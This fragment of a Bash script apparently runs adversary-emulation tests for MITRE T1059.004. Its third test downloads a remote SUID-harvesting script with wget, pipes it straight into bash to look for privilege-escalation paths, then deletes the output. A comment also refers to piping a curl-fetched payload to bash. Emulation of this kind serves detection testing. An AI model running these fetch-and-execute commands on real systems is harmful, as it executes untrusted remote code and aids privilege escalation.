...
# Using Curl to download and pipe a payload to Bash
    ...
    sleep 5
    rm /tmp/T1059.004-test2.txt
    rm /tmp/T1059.004-test2-2.txt
}

function c() {
# Atomic Test 3 - Harvest SUID executable files
# AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges.
    wget -O - https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/autosuid.sh | bash >> /tmp/T1059-004_autosuid1.txt
    echo  $(date -u) "Completed T1059.004 - Harvest SUID executable files" >> /tmp/attacktest.txt    
    sleep 5
    rm /tmp/T1059-004_autosuid1.txt
}
